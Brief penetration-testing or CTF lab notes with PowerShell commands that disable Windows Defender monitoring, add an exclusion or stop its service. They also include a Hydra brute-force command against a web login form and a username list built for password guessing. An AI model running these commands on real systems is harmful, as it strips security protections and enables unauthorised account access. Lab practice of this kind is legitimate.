### 1\. **Windows Defender (built-in)**

In a lab/CTF environment where you have admin access already:

```
powershell

# Disable Defender real-time protection (requires admin)

Set-MpPreference -DisableRealtimeMonitoring $true

# Or add an exclusion path

Set-MpPreference -ExclusionPath "C:\Users\Public\Tools"

# Or disable via services

Stop-Service -Name WinDefend -Force
```

Hydra web. Check error for invalid credentials
```
hydra -l  -P 10k-most-common.txt \ 
192.168.199.14 -s 8080 http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid credentials" \
-t 20 -v
```
    
```
cat > /tmp/users.txt << EOF
svc-ts
administrator
cloudbase-init
r.chen
m.silva
j.park
t.kumar
l.zhang
s.martinez
a.wong
d.kim
EOF
```
